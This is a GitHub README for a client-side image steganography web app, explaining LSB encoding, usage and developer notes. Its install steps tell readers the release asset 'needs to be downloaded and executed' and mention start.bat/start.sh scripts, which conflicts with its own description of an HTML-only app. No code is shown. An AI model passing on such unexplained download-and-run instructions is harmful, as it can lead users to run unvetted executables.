# Image Steganography Web App — Hide Messages in Images Fast

[![Releases](https://img.shields.io/github/v/release/eryantobow/Image-Steganography?style=for-the-badge&color=2b9348)](https://github.com/eryantobow/Image-Steganography/releases)

A simple web app that hides and extracts secret messages inside images. It uses basic steganography techniques with a clear HTML/JavaScript UI. Built for learning, testing, and light‑weight message hiding.

[![css](https://img.shields.io/badge/css-blue?style=flat-square)](https://github.com/eryantobow/Image-Steganography)
[![javascript](https://img.shields.io/badge/javascript-yellow?style=flat-square)](https://github.com/eryantobow/Image-Steganography)
[![steganography](https://img.shields.io/badge/steganography-purple?style=flat-square)](https://github.com/eryantobow/Image-Steganography)
[![security](https://img.shields.io/badge/security-red?style=flat-square)](https://github.com/eryantobow/Image-Steganography)
[![image-encoding](https://img.shields.io/badge/image--encoding-cyan?style=flat-square)](https://github.com/eryantobow/Image-Steganography)

Cover image  
![steganography cover](https://images.unsplash.com/photo-1517433456452-f9633a875f6f?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80)

Table of Contents
- Features
- How it works
- Supported formats
- Installation (Download and run)
- Usage (Encode / Decode)
- Developer guide
- Security and limitations
- Contributing
- License
- Links

Features
- Hide short text messages inside PNG or JPEG images using LSB-based encoding.
- Extract hidden messages from encoded images.
- Client-side processing. The app runs in the browser and does not send images or messages to a server.
- Plain HTML/CSS UI. No build step needed for the default release.
- Export and import encoded images as downloadable files.
- Small, readable code. Ideal for learning steganography basics.

How it works
- The app reads pixel data from an image using the Canvas API.
- It encodes message bits into the least significant bit (LSB) of color channels.
- It stores a short header (length + optional simple checksum) before the message bits.
- The decoder reads the header, then extracts the exact number of bits and reassembles the message.
- The app uses basic bitwise operations and browser file APIs. The approach balances simplicity and demonstrability.

Supported formats
- PNG: Full support. Lossless format preserves LSB changes.
- JPEG: Supported for demonstration. Lossy compression may break hidden data. Use PNG for reliable results.
- Browser compatibility: Modern browsers that support Canvas and File APIs.

Design goals
- Teach fundamentals of image steganography.
- Keep code small and readable.
- Offer a simple UI for encode and decode flows.
- Run fully on the client to protect user data from external servers.

Installation (Download and run)
1. Visit the Releases page and download the packaged release asset. The file needs to be downloaded and executed:
   https://github.com/eryantobow/Image-Steganography/releases
2. Typical release assets:
   - Image-Steganography-v1.0.zip — extract and open index.html in a browser.
   - Image-Steganography-v1.0.tar.gz — extract and open index.html.
   - For packaged builds, run start.bat on Windows or ./start.sh on macOS/Linux when provided.
3. After you extract the archive, open index.html in a modern browser to run the app.
4. If the link does not work, check the repository Releases section on GitHub.

Usage — Encode a message
- Open the web app in a browser.
- Load a source image (prefer PNG for best results).
- Enter the text message you want to hide.
- Choose a password if the UI offers one. (Password triggers basic XOR masking before LSB packing.)
- Click "Encode" or "Embed".
- The app shows an encoded preview and lets you download the modified image.
- Save the new image to your device. The image looks unchanged to the eye.

Usage — Decode a message
- Open the web app in a browser.
- Load the encoded image file.
- If a password was used during encoding, enter the same password.
- Click "Decode" or "Extract".
- The app reads header info and displays the hidden message in the output box.
- You can copy the message or save it as a text file.

Simple UI walkthrough
- Left panel: image input + encode controls.
- Center: canvas preview. Shows source and encoded images.
- Right panel: decode controls and message output.
- Buttons: Load image, Encode, Decode, Download encoded image, Clear.

Developer guide
Repository layout (typical)
- index.html — UI and app bootstrap.
- css/styles.css — UI layout and minimal styling.
- js/app.js — core encode/decode logic and event handlers.
- assets/ — optional icons and example images.
- docs/ — design notes and algorithm description.

Key functions and flow
- loadImage(file): Read file, create Image object, draw to canvas.
- readPixels(canvas): Return pixel buffer via getImageData.
- writePixels(canvas, buffer): Put modified buffer back via putImageData.
- encodeMessage(buffer, message, options): Convert message to bytes, pack header, embed bits in LSB positions.
- decodeMessage(buffer, options): Read header, extract bits, reconstruct message.
- xorMask(bytes, password): Apply simple XOR mask when password provided.

Testing tips
- Use PNG to verify bit-level changes.
- Encode a short message and decode it immediately to confirm pipeline.
- Inspect image data in developer console if you need to debug pixel buffers.

Security and limitations
- LSB steganography offers low resistance to forensic analysis and compression.
- JPEG compression can destroy embedded bits. Use PNG for reliable encoding.
- The optional XOR-based password provides simple obfuscation, not cryptographic encryption.
- For confidential communication, use proper encryption before embedding or use a secure channel.
- The app aims to teach steganography fundamentals, not to provide hardened secure messaging.

Performance
- The app handles images up to browser memory limits.
- Encoding and decoding run locally in milliseconds for common sizes (under a few megapixels).
- For large images, the app processes data in the main thread. You can modify the code to use Web Workers for background work.

Examples
- Hide a short note inside a logo image and send the image by email.
- Embed a non-critical access token in a PNG for demo purposes.
- Use the app in classroom exercises to show how hiding works and how compression affects hidden data.

Contribution
- Fork the repo.
- Create a branch for your change.
- Open a pull request with a clear description.
- Suggested areas: Web Worker support, improved header format, stronger optional encryption, progress UI, batch processing.

Common ideas to extend
- Add AES encryption before LSB packing for true confidentiality.
- Use steganographic algorithms beyond simple LSB, e.g., spread-spectrum or DCT domain methods for JPEG.
- Add multiple-channel support with per-channel embedding rates.
- Provide a CLI Node tool that runs the same encode/decode logic for batch use.

Acknowledgements
- Canvas API and File API make client-side image work simple.
- Many open tutorials inspired the LSB approach used here.

License
- The repository uses the MIT License. Refer to the LICENSE file in the project for details.

Contact
- Open issues on GitHub for bugs or feature requests.
- Use pull requests for code changes.

Quick links
- Releases (download and run the release asset): https://github.com/eryantobow/Image-Steganography/releases
- Repository topics: css, encryption, hidden-message, html, image-decoding, image-encoding, image-steganography, javascript, security, steganography, web-app

Badges
[![GitHub Repo Size](https://img.shields.io/github/repo-size/eryantobow/Image-Steganography?style=flat-square)](https://github.com/eryantobow/Image-Steganography)
[![Open Issues](https://img.shields.io/github/issues/eryantobow/Image-Steganography?style=flat-square)](https://github.com/eryantobow/Image-Steganography/issues)
[![License MIT](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)](https://github.com/eryantobow/Image-Steganography/blob/main/LICENSE)